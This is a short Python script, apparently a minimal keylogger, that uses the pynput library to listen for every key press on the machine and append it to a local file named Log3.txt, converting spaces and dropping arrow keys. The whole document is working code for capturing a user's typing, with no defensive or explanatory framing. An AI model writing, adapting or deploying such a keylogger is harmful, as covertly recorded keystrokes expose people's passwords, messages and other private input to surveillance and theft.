from pynput.keyboard import Listener

def WriteToFile(key):
    keydata=str(key)
    keydata=keydata.replace("'","")
    if keydata=="Key.space":
        keydata=' '
    elif keydata=="Key.down" or keydata=="Key.up":
        keydata=""
    with open("Log3.txt",'a') as f:
        f.write(keydata)
with Listener(on_press=WriteToFile) as f:
    f.join()